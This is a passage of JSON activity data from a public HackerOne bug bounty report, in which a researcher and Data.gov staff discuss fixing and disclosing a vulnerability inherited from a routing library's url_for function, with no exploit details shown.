","automated_response":false,"created_at":"2018-07-25T14:01:18.251Z","updated_at":"2018-07-25T14:01:18.251Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3097455,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax Yes, that's our plan and we believe that's safe to assume.","automated_response":false,"created_at":"2018-07-25T17:01:14.105Z","updated_at":"2018-07-25T17:01:14.105Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3161755,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This has been resolved by the Data.gov team.","automated_response":false,"created_at":"2018-08-08T13:59:19.365Z","updated_at":"2018-08-08T13:59:19.365Z","actor":{"username":"hyonjkim","cleared":false,"url":"/hyonjkim","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3163519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599\n\nMy understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893","automated_response":false,"created_at":"2018-08-08T22:42:56.979Z","updated_at":"2018-08-08T22:44:52.523Z","actor":{"username":"philipashlock","cleared":false,"url":"/philipashlock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3163556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue. ","automated_response":false,"created_at":"2018-08-08T23:08:55.407Z","updated_at":"2018-08-08T23:08:55.407Z","actor":{"username":"philipashlock","cleared":false,"url":"/philipashlock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3169078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.","automated_response":false,"created_at":"2018-08-09T21:53:04.904Z","updated_at":"2018-08-09T21:53:04.904Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3378835,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this issue could be marked as resolved now.","automated_response":false,"created_at":"2018-09-24T10:17:38.711Z","updated_at":"2018-09-24T10:17:38.711Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3511708,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello, \n\nThanks for submitting this report. We have determined that this report is now resolved. If you’re still able to reproduce  this issue, please let us know and we will investigate further. \n\nThanks! \n ","automated_response":false,"created_at":"2018-10-22T02:19:36.426Z","updated_at":"2018-10-22T02:19:36.426Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3512567,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-10-22T08:25:26.849Z","updated_at":"2018-10-22T08:25:26.849Z","first_to_agree":true,"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3572402,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-01T21:16:04.365Z","updated_at":"2018-11-01T21:16:04.365Z","actor":{"username":"jj-tts-tech-portfolio","cleared":false,"url":"/jj-tts-tech-portfolio","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3572403,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-11-01T21:16:04.444Z","updated_at":"2018-11-01T21:16:04.444Z","actor":{"username":"jj-tts-tech-portfolio","cleared":false,"url":"/jj-tts-tech-portfolio","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}